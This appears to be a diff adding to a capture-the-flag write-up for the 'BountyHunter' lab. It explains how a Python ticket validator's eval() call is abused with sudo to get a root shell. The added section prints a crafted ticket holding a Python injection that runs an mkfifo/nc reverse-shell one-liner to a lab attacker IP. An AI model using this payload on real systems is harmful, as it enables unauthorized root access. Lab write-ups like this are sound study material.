@@ -65,7 +65,7 @@ def main():
 
 main()
 ```
-* This python script checks if ticket conained in file is valid or not.
+* This python script checks if ticket contained in file is valid or not.
 * This script takes ticket file path as input.
 * This script checks if file ends with `md` extention.
 * Then scripts checks if lines of ticket file contains
@@ -75,7 +75,20 @@ main()
 	*  Fourth line starts with `**`.
 *  Then it strips of all `**` on fourth line and checks if first digit before `+`
 sign gives remainder of `4` when divided by `7` to check if ticket code is valid.
-* Then it evaluates the expression after stripping of all `**` and see if its total is greater than 100 to check if ticket is valid.
+* Then it evaluates the expression after stripping of all `**` and see if its total is greater than 100 to check if ticket is valid using `eval()` function.
+## Exploiting `eval()` function to get reverse shell as root
+First of all a file with `.md` extention was made satisfying all conditions of valid ticket in `/tmp/clarkey` directory named `a.md` which contained reverse shell code `__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.98 1234 >/tmp/f')` in statement that will evaluate using evail()
+```bash
+development@bountyhunter:/opt/skytrain_inc$ cat /tmp/clarkey/a.md
+# Skytrain Inc# Skytrain Inc
+## Ticket to New Haven
+__Ticket Code:__
+**4 + __import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.98 1234 >/tmp/f')**
+##Issued: 2021/04/06
+#End Ticket
+```
+Now running command `/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py` as sudo to get reverse shell 
+
 
 
 
